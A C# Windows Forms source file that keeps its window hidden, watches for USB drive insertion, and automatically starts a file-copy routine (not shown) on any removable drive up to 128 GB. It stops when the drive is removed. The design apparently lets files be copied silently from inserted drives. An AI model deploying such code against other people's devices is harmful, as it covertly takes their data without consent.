using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Configuration;

namespace CopyPlugin
{
    class PluginFileMgr : Form
    {
        public const int WM_DEVICECHANGE = 0x219;
        public const int DBT_DEVICEARRIVAL = 0x8000;
        public const int DBT_CONFIGCHANGECANCELED = 0x0019;
        public const int DBT_CONFIGCHANGED = 0x0018;
        public const int DBT_CUSTOMEVENT = 0x8006;
        public const int DBT_DEVICEQUERYREMOVE = 0x8001;
        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;
        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
        public const int DBT_DEVICEREMOVEPENDING = 0x8003;
        public const int DBT_DEVICETYPESPECIFIC = 0x8005;
        public const int DBT_DEVNODES_CHANGED = 0x0007;
        public const int DBT_QUERYCHANGECONFIG = 0x0017;
        public const int DBT_USERDEFINED = 0xFFFF;

       // private DriveInfo _diRemDevDisk = null;


        public PluginFileMgr()
        {
            this.Hide();
        }
        protected override void WndProc(ref   Message m)
        {
            try
            {             

                if (m.Msg == WM_DEVICECHANGE)
                {
                    CopyFiles cpFiles = new CopyFiles();
                    switch (m.WParam.ToInt32())
                    {
                        case WM_DEVICECHANGE:
                            break;
                        case DBT_DEVICEARRIVAL://U盘插入 
                            var capacity = ConfigurationManager.AppSettings["CapacityValue"];
                            long capacityInNum = 0;
                            long.TryParse(capacity, out capacityInNum);
                            if (capacityInNum == 0)
                            {
                                capacityInNum = 128;
                            }
                            DriveInfo[] s = DriveInfo.GetDrives();
                            foreach (DriveInfo drive in s)
                            {
                                if (drive.DriveType == DriveType.Removable && drive.TotalSize <= (long)(1073741824) * capacityInNum) // 128g disk
                                {
                                    cpFiles.SetDriverInfo(drive);
                                    cpFiles.StartCopy();
                                    // richTextBox1.AppendText( "U盘已插入，盘符为: "   +   drive.Name.ToString()   +   "\r\n "); 
                                    Trace.WriteLine("U盘已插入，盘符为: " + drive.Name.ToString());                                    
                                }
                            }
                            break;
                        case DBT_CONFIGCHANGECANCELED:
                            break;
                        case DBT_CONFIGCHANGED:
                            break;
                        case DBT_CUSTOMEVENT:
                            break;
                        case DBT_DEVICEQUERYREMOVE:
                            break;
                        case DBT_DEVICEQUERYREMOVEFAILED:
                            break;
                        case DBT_DEVICEREMOVECOMPLETE:   //U盘卸载 
                            cpFiles.StopCopy();
                            break;
                        case DBT_DEVICEREMOVEPENDING:
                            break;
                        case DBT_DEVICETYPESPECIFIC:
                            break;
                        case DBT_DEVNODES_CHANGED:
                            break;
                        case DBT_QUERYCHANGECONFIG:
                            break;
                        case DBT_USERDEFINED:
                            break;
                        default:
                            break;
                    }
                }
                this.Hide();
            }
            catch (Exception ex)
            {
                this.Hide();
                MessageBox.Show(ex.Message);
            }
            base.WndProc(ref   m);
        }
    }
}
